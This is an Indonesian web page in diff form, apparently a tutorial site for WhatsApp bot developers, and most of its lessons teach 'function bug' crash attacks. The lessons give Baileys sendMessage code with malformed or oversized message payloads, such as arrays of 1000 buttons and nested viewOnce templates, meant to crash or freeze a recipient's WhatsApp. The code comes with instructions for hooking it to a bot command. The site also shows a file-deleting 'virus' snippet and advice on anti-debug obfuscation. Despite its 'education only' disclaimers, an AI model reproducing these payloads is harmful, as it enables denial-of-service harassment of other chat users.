+    box-shadow: 0 0 10px #66ccff66;
+  "></div>
+
+  <div id="jawabanToxic" style="
+    align-self: flex-start;
+    background: linear-gradient(to top right, #444, #2b2b2b);
+    color: #c0c0c0;
+    padding: 14px 18px;
+    border-radius: 20px 20px 20px 4px;
+    max-width: 85%;
+    font-weight: normal;
+    box-shadow: inset 0 0 4px #9999, 0 0 10px #8883;
+    min-height: 60px;
+  "></div>
+</div>
+  <div style="text-align:center; margin-top:30px;">
+    <button class="btn" onclick="kembaliDashboard()">⬅ Balik ke Dashboard</button>
+  </div>
+</div>
+<!-- EDITOR -->
+<div class="glass" id="editorPage" style="display: none;">
+  <h2 style="text-align:center;">The End - Editor</h2>
+  <select id="modeSelect" onchange="setEditorMode(this.value)">
+    <option value="htmlmixed">HTML</option>
+    <option value="javascript">JavaScript</option>
+    <option value="css">CSS</option>
+    <option value="python">Python</option>
+    <option value="text">Text</option>
+  </select>
+  <textarea id="codeEditor"></textarea>
+  <br />
+  <button class="btn" onclick="jalankanKode()">▶️ Jalankan</button>
+  <button class="btn logout" onclick="kembaliDashboard()">⬅ Kembali ke Dashboard</button>
+</div>
+
+<!-- OUTPUT -->
+<div class="glass" id="outputPage" style="display: none;">
+  <button class="btn logout" onclick="kembaliEditor()" style="margin-bottom:10px;">⬅ Kembali ke Editor</button>
+  <iframe id="previewFrame"></iframe>
+</div>
+<!-- Tambahkan langsung di bawah sini -->
+<div class="glass" id="errorChecker" style="display:none;">
+  <h3 style="text-align:center; color:#66ccff; text-shadow: 0 0 10px white;">🧠 The End Checker</h3>
+
+  <div class="btn-group" style="text-align:center;">
+    <input type="file" accept=".js" onchange="handleFile(event)" class="btn"/>
+    <button class="btn" onclick="jalankan()">Cek Error</button>
+    <button class="btn" onclick="reset()">Reset</button>
+  </div>
+
+  <div class="input-area" style="display:flex; flex-wrap:wrap; gap:15px; justify-content:space-between; margin-top:1rem;">
+    <textarea id="code" placeholder="Paste script JS kamu di sini..." style="flex:1 1 48%; height:300px; background:#0e1c26; color:#aafaff;"></textarea>
+    <div class="output" style="flex:1 1 48%; display:flex; flex-direction:column; gap:10px;">
+      <div class="info-box" id="hasil">Hasil error akan tampil di sini</div>
+      <div class="info-box" id="arti">Arti error akan dijelaskan di sini</div>
+      <div class="info-box" id="solusi">Solusi akan muncul di sini</div>
+    </div>
+  </div>
+
+  <div style="text-align:center; margin-top:1rem;">
+    <button onclick="kembaliDariErrorChecker()">⬅ Kembali ke Dashboard</button>
+  </div>
+</div>
+  <script>
+    function login() {
+      const user = document.getElementById("nama").value.trim();
+      if (!user) {
+        alert("Isi dulu namanya ya!");
+        return;
+      }
+      localStorage.setItem("devUser", user);
+      document.getElementById("loginContainer").style.display = 'none';
+      document.getElementById("dashboard").style.display = 'block';
+      document.getElementById("welcomeMsg").textContent = `Selamat datang, ${user}!`;
+    }
+
+    function showMateri(id) {
+      document.getElementById("dashboard").style.display = 'none';
+      document.getElementById("materiPage").style.display = 'block';
+
+      const judul = document.getElementById("judulMateri");
+      const konten = document.getElementById("kontenMateri");
+
+      const daftarJudul = {
+      carabuatFunc: "Gimana Cara Buat Function Bug?",
+        functionBug: "Apa Itu Function Bug?",
+        scriptWa: "Cara Buat Script WhatsApp",
+        struktur: "Struktur Project Script",
+        scriptTelegram: "Cara Buat Script Telegram",
+        pasangFunction: "Cara Masang Function Bug",
+        handler: "Command Handler Bot",
+        proteksi: "Cara Lindungi Script dari Bypass/Crack",
+        hosting: "Cara Hosting di VPS",
+        pterodactyl: "Panel Pterodactyl",
+        autodeploy: "Auto Deploy Bot",
+        jsonapi: "JSON & API & Webhook",
+        obfuscate: "Obfuscate & Proteksi File",
+        panelWeb: "Cara Buat Website Panel Sendiri",
+        apaItuBug: "Apa Itu Bug WhatsApp",
+  caraKerjaBug: "Cara Kerja Bug WhatsApp",
+  jenisBug: "Jenis-Jenis Bug WhatsApp",
+  kenapaTerjadi: "Kenapa Bug Bisa Terjadi",
+  contohPayload: "Contoh Payload Bug WA",
+  deteksiBug: "Mendeteksi Bug WhatsApp",
+  perlindungan: "Cara Melindungi Diri dari Bug WA",
+  etika: "Etika & Legalitas Bug",
+  perbedaanDevice: "Bug WA: Mobile vs Web",
+  efektifitas2025: "Apakah Bug WA Masih Efektif di 2025?",
+  macamVirus: "Macam-macam Virus",
+  apaItuVirus: "Apa Itu Virus",
+  strukturCrash: "Struktur yang Membuat WhatsApp Jadi Crash",
+        uploadVPS: "Cara Upload File ke VPS",
+        perbedaanBugVirus: "Perbedaan Bug dan Virus",
+        deteksiFile: "Cara Deteksi File Berbahaya di Script",
+bedabot: "Perbedaan Bot Client vs Baileys",
+obfuscateExtreme: "Teknik Obfuscate Ekstrem + Anti Decode",
+  customPayload: "Cara Buat Payload Custom untuk Crash App Chat",
+  crashTanpaFile: "Teknik Crash WhatsApp Tanpa Kirim File",
+  pushInvisible: "Bot yang Bisa Kirim Pesan Tanpa Disimpan (Push Invisible)"
+      };
+
+      const daftarKonten = {
+      carabuatFunc: ` <h1>Cara Membuat Function Bug WhatsApp</h1>
+
+    <div class="penjelasan">
+      Untuk membuat <strong>function bug</strong>, kamu perlu pahami struktur pesan WhatsApp. Bug dikirim via <code>relayMessage</code> dengan isi struktur kompleks atau abnormal yang memicu crash, freeze, lag, atau force close, struktur nya di bawah.
+    </div>
+
+    <h2>Contoh Dasar Function</h2>
+    <pre><code>async function kirimBug(jid, sock) {
+  const bug = {
+    nativeFlowMessage: {
+      buttonParamsJson: JSON.stringify({ title: "ZalDestroy", sections: [] }),
+      messageParamsJson: JSON.stringify({ text: "Bug Native", footer: "ZalTeam" })
+    }
+  };
+  await sock.sendMessage(jid, bug);
+}</code></pre>
+
+    <h2>nativeFlowMessage</h2>
+    <pre><code>{
+  nativeFlowMessage: {
+    buttonParamsJson: JSON.stringify({ title: "Zal", sections: [] }),
+    messageParamsJson: JSON.stringify({ text: "Native Flow", footer: "Zal" })
+  }
+}</code></pre>
+
+    <h2>carouselMessage</h2>
+    <pre><code>{
+  carouselMessage: {
+    cards: [],
+    title: "Zal Carousel",
+    description: "Trigger freeze"
+  }
+}</code></pre>
+
+    <h2>interactiveMessage</h2>
+    <pre><code>{
+  interactiveMessage: {
+    body: { text: "🧨 Crash Click" },
+    footer: { text: "Klik cepat" },
+    action: {
+      button: "Zal",
+      sections: [{ title: "Crash", rows: [] }]
+    }
+  }
+}</code></pre>
+
+    <h2>newsletterAdminInviteMessage</h2>
+    <pre><code>{
+  newsletterAdminInviteMessage: {
+    name: "Zal Channel",
+    inviteCode: "ZALBUG123",
+    inviteExpiration: "999999999",
+    caption: "Gabung",
+    thumbnailUrl: "https://zal.img"
+  }
+}</code></pre>
+
+    <h2>orderMessage</h2>
+    <pre><code>{
+  orderMessage: {
+    orderId: "ZAL123",
+    itemCount: 9999,
+    totalAmount1000: 9999999,
+    status: 1
+  }
+}</code></pre>
+
+    <h2>Struktur - contactMessage</h2>
+    <pre><code>{
+  contactMessage: {
+    displayName: "Bug Contact",
+    vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:ZalBug\nTEL:+99999999\nEND:VCARD"
+  }
+}</code></pre>
+
+    <h2>groupInviteMessage</h2>
+    <pre><code>{
+  groupInviteMessage: {
+    groupJid: "1203xxx@g.us",
+    groupName: "Bug Group",
+    caption: "Masuk cepat",
+    jpegThumbnail: fs.readFileSync('./bug.jpg'),
+    inviteCode: "ZALCODE"
+  }
+}</code></pre>
+
+    <h2>Struktur - productMessage</h2>
+    <pre><code>{
+  productMessage: {
+    productImageCount: 9999,
+    priceAmount1000: 999999,
+    currencyCode: "USD",
+    title: "Produk ZalBug"
+  }
+}</code></pre>
+
+    <h2>audioMessage (Delay Bug)</h2>
+    <pre><code>{
+  audioMessage: {
+    url: "https://bug.zal.com/freeze.mp4",
+    mimetype: "audio/mp4",
+    ptt: true,
+    seconds: 99999,
+    fileLength: "9999999"
+  }
+}</code></pre>
+
+    <div class="box">
+      <h2>Contoh Function Bug</h2>
+      <pre><code>async function zalBrutalCrash(jid, sock) {
+  const payload = {
+    nativeFlowMessage: {
+      buttonParamsJson: JSON.stringify({
+        title: "💀 ZAL BRUTAL MODE 💀",
+        sections: Array(20).fill({
+          title: "⚠️ Zal Exploit Zone",
+          rows: Array(30).fill({ title: "⚡ Freeze Trigger", rowId: "ZAL_LAG_SYSTEM" })
+        })
+      }),
+      messageParamsJson: JSON.stringify({
+        text: "Zal Crash System",
+        footer: "ZalOfficial Exploit"
+      })
+    },
+    interactiveMessage: {
+      body: { text: "⛔ DO NOT CLICK!" },
+      footer: { text: "💣 Zal Bug Activated" },
+      action: {
+        button: "💥 Activate",
+        sections: [
+          {
+            title: "Danger Zone",
+            rows: [
+              { title: "🧨 Crash1", rowId: "zal1" },
+              { title: "🧨 Crash2", rowId: "zal2" },
+              { title: "🧨 Crash3", rowId: "zal3" }
+            ]
+          }
+        ]
+      }
+    },
+    newsletterAdminInviteMessage: {
+      name: "ZalBugBroadcast",
+      inviteCode: "CRASHFORCE",
+      inviteExpiration: "9999999999",
+      caption: "ZalBroadcast Bug Mode",
+      thumbnailUrl: "https://telegra.ph/file/b66d6f5a7ac32a3c5e5c9.jpg"
+    }
+  };
+
+  await sock.sendMessage(jid, payload);
+}</code></pre>
+    </div>
+    <h2>Tips & Catatan</h2>
+    <div class="penjelasan">
+      • Selalu test bug di akun dummy dulu<br>
+      • Gunakan file kecil yang padat isi atau struktur kompleks JSON kosong<br>
+      • Kombinasi delay + struktur nativeFlow paling banyak menimbulkan lag<br>
+      • Semua struktur bisa digabung ke dalam satu relayMessage
+    </div>
+
+    <h2>Kontak Developer ZalOfficial</h2>
+    <div class="penjelasan">
+      Web ini dibuat untuk edukasi struktur function bug WA (Baileys/MultiDevice).<br><br>
+      Hubungi: <a href="https://wa.me/6289524134626" target="_blank">Klik untuk WhatsApp Dev Zal</a>
+    </div>`,
+        crashTanpaFile: `<h3>💣 Teknik Crash WhatsApp Tanpa Kirim File</h3>
+<p>Banyak orang mengira crash hanya bisa dilakukan lewat file besar. Nyatanya, kamu bisa menyebabkan lag/crash hanya dengan satu baris pesan.</p>
+
+<h4>🚫 Tanpa Kirim File</h4>
+<ul>
+  <li>Gunakan struktur pesan JSON kompleks.</li>
+  <li>Pakai kombinasi tag HTML atau Unicode rusak.</li>
+  <li>Tambahkan viewOnce dengan nested template panjang.</li>
+</ul>
+
+<h4>📥 Contoh Struktur</h4>
+<pre><code>
+{
+  viewOnceMessage: {
+    message: {
+      extendedTextMessage: {
+        text: "<b><marquee>⚠️ Crash WhatsApp</marquee></b>"
+      }
+    }
+  }
+}
+</code></pre>
+
+<h4>💡 Kenapa Bisa Crash?</h4>
+<p>Karena WhatsApp mencoba render HTML/Unicode rusak yang tidak dikenali. Parsing gagal, app freeze.</p>
+
+<h4>⚠️ Catatan</h4>
+<p>Fitur ini sering ditambal WhatsApp. Harus selalu eksperimen ulang. Jangan gunakan ke orang lain!</p>`,
+        pushInvisible: `<h3>👻 Bot Kirim Pesan Tanpa Disimpan (Push Invisible)</h3>
+<p>Secara default, WhatsApp tidak menerima pesan dari nomor yang belum disimpan. Tapi dengan teknik tertentu, bot bisa kirim pesan langsung meski tidak saling simpan kontak.</p>
+
+<h4>📲 Teknik Push Invisible</h4>
+<ul>
+  <li>Gunakan nomor bot dengan WhatsApp Business API atau multi-device WA Web.</li>
+  <li>Gunakan ID JID secara langsung, contoh: <code>628xxxx@s.whatsapp.net</code>.</li>
+  <li>Pastikan nomor target tidak memblokir pesan dari siapa pun.</li>
+</ul>
+
+<h4>🛠️ Contoh Kode WA Web</h4>
+<pre><code>
+await sock.sendMessage("628xxxx@s.whatsapp.net", {
+  text: "Hai, ini bot!"
+});
+</code></pre>
+
+<h4>🎯 Kegunaan</h4>
+<ul>
+  <li>Notifikasi otomatis tanpa harus save nomor.</li>
+  <li>Bot alert ke user baru, admin grup, dll.</li>
+</ul>
+
+<h4>⚠️ Peringatan</h4>
+<p>Jangan digunakan untuk spam. WhatsApp akan membatasi atau blokir nomor bot jika dianggap abuse.</p>`,
+        customPayload: `<h3>📦 Cara Buat Payload Custom untuk Crash App Chat</h3>
+<p>Payload custom adalah struktur pesan yang sengaja dirancang untuk membuat aplikasi seperti WhatsApp atau Telegram mengalami error.</p>
+
+<h4>🎯 Tujuan</h4>
+<ul>
+  <li>Testing ketahanan aplikasi.</li>
+  <li>Eksperimen struktur parsing sistem chat.</li>
+</ul>
+
+<h4>🛠️ Contoh Payload Dasar</h4>
+<pre><code>
+const payload = {
+  viewOnceMessage: {
+    message: {
+      templateMessage: {
+        hydratedTemplate: {
+          hydratedContentText: "*💥 CRASH*",
+          hydratedButtons: new Array(1000).fill({
+            quickReplyButton: {
+              displayText: "💣",
+              id: "bug"
+            }
+          })
+        }
+      }
+    }
+  }
+}
+</code></pre>
+
+<h4>🔍 Modifikasi Payload</h4>
+<ul>
+  <li>Tambahkan <strong>struktur JSON berulang</strong>.</li>
+  <li>Tambahkan <strong>emoji rusak</strong> atau simbol aneh di text.</li>
+  <li>Isi dengan <strong>template panjang</strong> atau <code>null</code>.</li>
+</ul>
+
+<h4>⚠️ Peringatan</h4>
+<p>Jangan disalahgunakan. Hanya untuk edukasi dan testing pribadi.</p>`,
+        obfuscateExtreme: `<h3>🛡️ Teknik Obfuscate Ekstrem + Anti Decode</h3>
+<p>Obfuscation adalah proses mengacak kode agar tidak mudah dibaca atau dibongkar. Teknik ini sering digunakan agar script tidak mudah dicrack atau dimodifikasi oleh pihak lain.</p>
+
+<h4>🔍 Tujuan Obfuscation</h4>
+<ul>
+  <li>Melindungi logika dan struktur asli kode.</li>
+  <li>Menghindari pencurian script atau payload.</li>
+  <li>Meningkatkan keamanan dari teknik bypass sederhana.</li>
+</ul>
+
+<h4>🧪 Teknik Obfuscasi Ekstrem</h4>
+<p>Obfuscasi ekstrem biasanya menggunakan kombinasi:</p>
+<ul>
+  <li>Encoding base64 + base32 + hex berlapis-lapis.</li>
+  <li>Pemanggilan fungsi secara dinamis (eval, Function constructor).</li>
+  <li>Pengacak variabel dan fungsi secara acak.</li>
+</ul>
+
+<h4>🛑 Anti Decode Protection</h4>
+<p>Tambahkan juga:</p>
+<ul>
+  <li>Anti-debugger (blok <code>console.log</code>, <code>console.debug</code>).</li>
+  <li>Loop anti-bongkar (fungsi berjalan terus saat terdeteksi buka di devtools).</li>
+  <li>Auto-delete ketika kode terdeteksi dibuka manual.</li>
+</ul>
+
+<h4>⚠️ Catatan</h4>
+<p>Gunakan obfuscation hanya pada bagian penting. Hindari terlalu ekstrem agar tidak merusak performa bot atau script.</p>`,
+        deteksiFile: `<h4>🧠 Apa itu file berbahaya?</h4>
+    <p>File berbahaya dalam script bisa mencuri data, merusak sistem, atau menyembunyikan backdoor. Biasanya ditemukan pada script bajakan atau dari sumber tidak resmi.</p>
+
+    <h4>🔍 Ciri-ciri Umum</h4>
+    <ul>
+      <li><strong>Obfuscated code:</strong> variabel dan fungsi acak seperti <code>_0xabc</code></li>
+      <li><strong>eval(), exec(), Function():</strong> bisa menjalankan kode tersembunyi</li>
+      <li><strong>Akses URL asing:</strong> fetch/download dari server tidak dikenal</li>
+      <li><strong>Auto-run script:</strong> file berjalan otomatis saat dijalankan</li>
+    </ul>
+
+    <h4>🧰 Tips Deteksi</h4>
+    <ul>
+      <li>Gunakan <code>grep</code>, <code>VS Code</code> untuk scan kata kunci berbahaya</li>
+      <li>Upload file ke <a href="https://virustotal.com" target="_blank">VirusTotal</a></li>
+      <li>Jangan pakai script dari sumber tidak dikenal!</li>
+    </ul>`,
+        bedabot: `<h4>🤖 Apa itu Bot Client?</h4>
+    <p>Bot client adalah bot yang berjalan langsung di atas WhatsApp Web API menggunakan browser otomatis (seperti puppeteer, venom.js, dll).</p>
+
+    <h4>📡 Apa itu Bot Baileys?</h4>
+    <p>Baileys adalah library Node.js yang menggunakan WebSocket untuk terhubung ke WhatsApp tanpa browser. Lebih ringan, stabil, dan banyak digunakan oleh developer sekarang.</p>
+
+    <h4>⚖️ Perbandingan</h4>
+    <table border="1" style="font-size: 0.75rem; width: 100%; border-collapse: collapse;">
+      <tr><th style="padding:4px;">Fitur</th><th>Client</th><th>Baileys</th></tr>
+      <tr><td style="padding:4px;">Performa</td><td>Berat</td><td>Ringan</td></tr>
+      <tr><td style="padding:4px;">Stabilitas</td><td>Rentan crash</td><td>Lebih stabil</td></tr>
+      <tr><td style="padding:4px;">Update</td><td>Lambat</td><td>Aktif</td></tr>
+      <tr><td style="padding:4px;">Kontrol</td><td>Terbatas</td><td>Luas (raw API)</td></tr>
+    </table>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Kalau kamu butuh bot yang ringan dan mudah dikembangkan, Baileys lebih disarankan daripada client berbasis browser.</p>`,
+        macamVirus: `<h4>🦠 Virus dalam Konteks Script dan Bot</h4>
+<p>Dalam dunia pengembangan bot atau script, "virus" bukan hanya sekadar malware, tapi mencakup banyak jenis payload atau kode berbahaya yang bisa merusak sistem, mencuri data, atau menyebabkan gangguan serius pada pengguna.</p>
+
+<h4>📂 Jenis-Jenis Virus yang Sering Dijumpai</h4>
+<ul>
+  <li><strong>Keylogger</strong> – Merekam setiap tombol yang ditekan korban.</li>
+  <li><strong>Trojan</strong> – Menyamar sebagai program normal tapi menyisipkan fungsi berbahaya.</li>
+  <li><strong>Worm</strong> – Menyebar otomatis ke perangkat lain tanpa interaksi pengguna.</li>
+  <li><strong>Ransomware</strong> – Mengenkripsi data korban lalu minta tebusan.</li>
+  <li><strong>Botnet Payload</strong> – Mengontrol perangkat korban jadi bagian jaringan bot.</li>
+</ul>
+
+<h4>🚨 Peringatan</h4>
+<p>Script semacam ini <strong>dilarang keras</strong> digunakan untuk hal merugikan. Gunakan hanya untuk pembelajaran, testing di lingkungan sendiri, atau simulasi keamanan.</p>`,
+        apaItuVirus: `<h4>🧬 Definisi Virus Digital</h4>
+<p>Virus adalah program atau potongan kode berbahaya yang dapat mereplikasi dirinya sendiri dan menyebar dari satu perangkat ke perangkat lain. Dalam konteks bot/script, virus bisa berupa file .js, .py, atau binary yang menjalankan fungsi merusak tanpa sepengetahuan user.</p>
+
+<h4>🎯 Tujuan Virus Diciptakan</h4>
+<ul>
+  <li>Mengambil alih sistem</li>
+  <li>Mencuri data (password, token)</li>
+  <li>Merusak atau menghapus file</li>
+  <li>Mengganggu sistem (DoS attack)</li>
+</ul>
+
+<h4>🧪 Contoh Sederhana</h4>
+<pre><code>
+// Contoh 'virus' sederhana di JavaScript
+const fs = require('fs');
+fs.unlinkSync("C:/Users/User/Documents/important.txt");
+</code></pre>
+
+<p>Contoh di atas secara paksa menghapus file penting. Jangan dijalankan di sistem utama!</p>`,
+        strukturCrash: `<h4>📱 Struktur Pesan Berbahaya</h4>
+<p>Aplikasi seperti WhatsApp punya parser untuk menampilkan pesan. Jika struktur pesan rusak atau terlalu berat, client tidak bisa render dengan benar, dan akhirnya crash, lag, atau freeze.</p>
+
+<h4>🧨 Contoh Struktur Crash</h4>
+<pre><code>
+const bugPayload = {
+  viewOnceMessage: {
+    message: {
+      templateMessage: {
+        hydratedTemplate: {
+          hydratedContentText: '*CRASH*',
+          hydratedButtons: Array(1000).fill({
+            quickReplyButton: {
+              displayText: '🔥',
+              id: 'spam'
+            }
+          })
+        }
+      }
+    }
+  }
+};
+</code></pre>
+
+<h4>🛠 Kenapa Ini Bisa Menyebabkan Crash?</h4>
+<ul>
+  <li>Parser WhatsApp terlalu banyak meng-handle elemen UI</li>
+  <li>Payload terlalu besar (melebihi buffer)</li>
+  <li>Format tidak valid, memicu error di dalam aplikasi</li>
+</ul>
+
+<h4>⚠️ Penting!</h4>
+<p>Struktur ini hanya untuk edukasi, uji coba di perangkat sendiri. Jangan disebarkan ke publik atau digunakan untuk serangan!</p>`,
+        perbedaanBugVirus: `<h4>🧠 Pengertian Umum</h4>
+<p><strong>Bug</strong> adalah kesalahan dalam kode atau sistem yang menyebabkan perilaku tak terduga. Sedangkan <strong>virus</strong> adalah program berbahaya yang dirancang untuk merusak, mencuri, atau menyebar tanpa izin.</p>
+
+<h4>🔍 Perbedaan Utama</h4>
+<table style="width:100%; font-size: 0.75rem;">
+  <thead>
+    <tr>
+      <th style="text-align:left;">Aspek</th>
+      <th>Bug</th>
+      <th>Virus</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Tujuan</td>
+      <td>Tidak disengaja / hasil kesalahan coding</td>
+      <td>Disengaja, untuk tujuan merusak atau mencuri</td>
+    </tr>
+    <tr>
+      <td>Cara Kerja</td>
+      <td>Trigger error/crash pada sistem</td>
+      <td>Menginfeksi, menyebar, merusak sistem</td>
+    </tr>
+    <tr>
+      <td>Contoh</td>
+      <td>Pesan crash WhatsApp</td>
+      <td>Ransomware, Keylogger, Worm</td>
+    </tr>
+    <tr>
+      <td>Legalitas</td>
+      <td>Bisa legal (jika digunakan untuk testing)</td>
+      <td>Hampir selalu ilegal</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4>⚠️ Sering Disalahartikan</h4>
+<p>Banyak orang mengira bug itu virus, padahal tidak selalu. Bug bisa jadi jalan masuk untuk virus, tapi bug sendiri tidak berniat merusak secara aktif.</p>
+
+<h4>🛡️ Kesimpulan</h4>
+<p>Bug adalah hasil dari kesalahan, sementara virus adalah hasil dari niat. Keduanya bisa membahayakan, tapi virus punya tujuan jahat. Bug bisa diperbaiki — virus harus dicegah.</p>`,
+        functionBug: `   <h4>🧠 Pengertian</h4>
+    <p>Function bug adalah sebuah fungsi dalam script (biasanya di bot WhatsApp atau Telegram) yang digunakan untuk mengirim struktur pesan tertentu yang dirancang secara sengaja agar membuat aplikasi client crash, lag, freeze, atau bahkan force close.</p>
+
+    <h4>🎯 Tujuan Penggunaan</h4>
+    <ul>
+      <li>Untuk menguji ketahanan aplikasi (testing).</li>
+      <li>Eksperimen struktur parsing pesan.</li>
+      <li>Demonstrasi payload berbahaya (untuk edukasi).</li>
+      <li>Penelitian keamanan sistem chat.</li>
+    </ul>
+
+    <h4>💡 Konsep Dasar</h4>
+    <p>WhatsApp dan Telegram memiliki struktur parsing data tertentu. Jika kamu mengirim data yang malformed (rusak), atau terlalu besar, atau tidak sesuai format JSON mereka, maka client bisa gagal parsing dan crash.</p>
+
+    <h4>📦 Struktur Function Bug</h4>
+    <p>Struktur umum function bug seperti ini:</p>
+    <pre><code>
+// functionBug.js
+async function kirimBug(jid, sock) {
+  const bugPayload = {
+    viewOnceMessage: {
+      message: {
+        templateMessage: {
+          hydratedTemplate: {
+            hydratedContentText: '*⚠️ CRASH PAYLOAD TEST*',
+            hydratedButtons: [
+              {
+                quickReplyButton: {
+                  displayText: '💥 BUG!',
+                  id: 'bug_exploit'
+                }
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+  await sock.sendMessage(jid, bugPayload);
+}
+module.exports = kirimBug;
+    </code></pre>
+
+    <h4>📁 Struktur Project Direkomendasikan</h4>
+    <pre><code>
+/project/
+├── index.js
+├── bugs/
+│   └── functionBug.js
+├── session/
+├── node_modules/
+└── package.json
+    </code></pre>
+
+    <h4>🔧 Cara Pakai</h4>
+    <p>Di dalam file <code>index.js</code> kamu tinggal panggil function ini saat menerima command:</p>
+    <pre><code>
+const kirimBug = require('./bugs/functionBug');
+
+if (command === 'bug') {
+  await kirimBug(sender, sock);
+}
+    </code></pre>
+
+    <h4>⚠️ Peringatan!</h4>
+    <ul>
+      <li>Jangan gunakan ini untuk menjahili orang secara sengaja.</li>
+      <li>Gunakan hanya untuk testing atau demo keamanan pribadi.</li>
+      <li>WhatsApp bisa update sistem mereka dan bug lama tidak bekerja lagi.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Function bug adalah teknik mengirim struktur pesan abnormal ke aplikasi chat seperti WhatsApp dengan tujuan membuat aplikasi target bermasalah. Gunakan dengan bijak dan hanya untuk edukasi.</p>
+        `,
+        scriptWa: `
+         
+    <h4>📌 Tujuan</h4>
+    <p>Membuat bot WhatsApp yang bisa balas otomatis, deteksi pesan masuk, dan kirim pesan secara realtime, menggunakan library <code>Baileys</code>.</p>
+
+    <h4>📁 Struktur Folder</h4>
+    <pre><code>
+/project-wa/
+├── index.js
+├── package.json
+└── session/
+    </code></pre>
+
+    <h4>🔧 1. Inisialisasi Proyek</h4>
+    <p>Buka terminal Pterodactyl dan jalankan perintah:</p>
+    <pre><code>npm init -y
+npm install @whiskeysockets/baileys</code></pre>
+
+    <h4>📜 2. Isi File <code>index.js</code></h4>
+    <pre><code>
+const { default: makeWASocket, useSingleFileAuthState } = require("@whiskeysockets/baileys");
+const { Boom } = require("@hapi/boom");
+const fs = require("fs");
+
+const { state, saveState } = useSingleFileAuthState('./session/baileys_auth.json');
+
+async function startBot() {
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: true
+  });
+
+  sock.ev.on("creds.update", saveState);
+
+  sock.ev.on("messages.upsert", async ({ messages }) => {
+    const msg = messages[0];
+    if (!msg.message) return;
+    const from = msg.key.remoteJid;
+    const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
+
+    if (text === "!menu") {
+      await sock.sendMessage(from, { text: "📦 Menu:\n1. !ping\n2. !owner" });
+    } else if (text === "!ping") {
+      await sock.sendMessage(from, { text: "🏓 Pong!" });
+    }
+  });
+}
+
+startBot();
+    </code></pre>
+
+    <h4>📦 3. Jalankan Bot</h4>
+    <p>Di panel Pterodactyl, klik tombol "Start". Scan QR yang muncul lewat WhatsApp Web.</p>
+
+    <h4>🎯 4. Uji Coba</h4>
+    <p>Kirim <code>!menu</code> ke nomor bot kamu. Bot akan membalas otomatis.</p>
+
+    <h4>✅ Selesai</h4>
+    <p>Selamat! Kamu sudah berhasil bikin script WhatsApp pertama kamu menggunakan <code>Baileys</code>. Kamu bisa lanjut buat command modular, tambahkan fitur ban, menu, anti delete, dan lainnya!</p>
+        `,
+        struktur: `
+    <h4>📂 Apa Itu Struktur Project?</h4>
+    <p>Struktur project adalah susunan folder dan file dalam sebuah proyek pemrograman yang dibuat supaya kode terorganisir dengan baik dan mudah dipahami atau dikembangkan.</p>
+
+    <h4>📌 Kenapa Struktur Project Penting?</h4>
+    <ul>
+      <li>Membantu pengelolaan kode yang rapi dan terstruktur.</li>
+      <li>Mudahkan kolaborasi dengan programmer lain.</li>
+      <li>Memudahkan pemeliharaan dan pengembangan kode ke depannya.</li>
+    </ul>
+
+    <h4>🛠️ Contoh Struktur Project Script Bot WhatsApp</h4>
+    <pre><code>
+/project-wa/
+├── commands/        # Folder berisi semua file command
+│   ├── ping.js
+│   ├── bug.js
+│   └── help.js
+├── events/          # Folder untuk event handler (misal onMessage, onCall)
+│   └── message.js
+├── libs/            # Kode library / helper function
+│   └── utils.js
+├── session/         # File sesi login Baileys
+│   └── baileys_auth.json
+├── index.js         # File utama bot berjalan
+├── package.json
+└── README.md
+    </code></pre>
+
+    <h4>🔧 Penjelasan Singkat Tiap Folder / File</h4>
+    <ul>
+      <li><strong>commands/</strong>: Berisi script perintah bot, misal ping, bug, help, dsb.</li>
+      <li><strong>events/</strong>: Tempat handle event WhatsApp, seperti pesan masuk, panggilan, dsb.</li>
+      <li><strong>libs/</strong>: Fungsi tambahan dan utilities.</li>
+      <li><strong>session/</strong>: File sesi login agar bot tidak perlu scan QR berulang.</li>
+      <li><strong>index.js</strong>: Entry point atau titik awal bot berjalan.</li>
+      <li><strong>package.json</strong>: Daftar dependencies dan info proyek Node.js.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Struktur project yang rapi dan terorganisir membuat pengembangan bot jadi lebih mudah, cepat, dan minim error. Selalu gunakan struktur yang jelas dan konsisten.</p>
+  `,
+        scriptTelegram: `
+    <h4>📌 Tujuan</h4>
+    <p>Membuat bot Telegram yang bisa balas pesan otomatis, menangani command, dan berinteraksi dengan pengguna menggunakan <code>telegraf</code>, library Telegram Bot API untuk Node.js.</p>
+
+    <h4>📁 Struktur Folder</h4>
+    <pre><code>
+/project-telegram/
+├── commands/
+│   ├── start.js
+│   └── help.js
+├── index.js
+├── package.json
+└── node_modules/
+    </code></pre>
+
+    <h4>🔧 1. Inisialisasi Proyek</h4>
+    <p>Buka terminal VPS atau lokal dan jalankan perintah:</p>
+    <pre><code>npm init -y
+npm install telegraf</code></pre>
+
+    <h4>📜 2. Buat File <code>index.js</code></h4>
+    <pre><code>
+const { Telegraf } = require('telegraf');
+const bot = new Telegraf('TOKEN_BOT_TELEGRAM');
+
+bot.start((ctx) => ctx.reply('Halo! Selamat datang di bot Telegram.'));
+bot.help((ctx) => ctx.reply('Kirim command /start untuk memulai.'));
+
+bot.command('ping', (ctx) => ctx.reply('Pong!'));
+
+bot.on('text', (ctx) => {
+  ctx.reply('Kamu mengirim: ' + ctx.message.text);
+});
+
+bot.launch();
+
+console.log('Bot Telegram berjalan...');
+    </code></pre>
+
+    <h4>📦 3. Jalankan Bot</h4>
+    <p>Jalankan perintah <code>node index.js</code> di terminal VPS kamu.</p>
+
+    <h4>🎯 4. Tes Bot</h4>
+    <p>Cari bot kamu di Telegram (menggunakan username yang sudah didaftarkan bot), kirim /start atau /ping, dan lihat balasannya.</p>
+
+    <h4>⚠️ Catatan</h4>
+    <ul>
+      <li>Pastikan TOKEN_BOT_TELEGRAM diganti dengan token asli dari BotFather.</li>
+      <li>Gunakan webhook jika ingin deploy bot di server production.</li>
+    </ul>
+
+    <h4>✅ Selesai</h4>
+    <p>Kamu sudah berhasil membuat bot Telegram sederhana menggunakan Telegraf.</p>
+  `,
+        pasangFunction: `
+    <h4>🧩 Apa itu Function Bug?</h4>
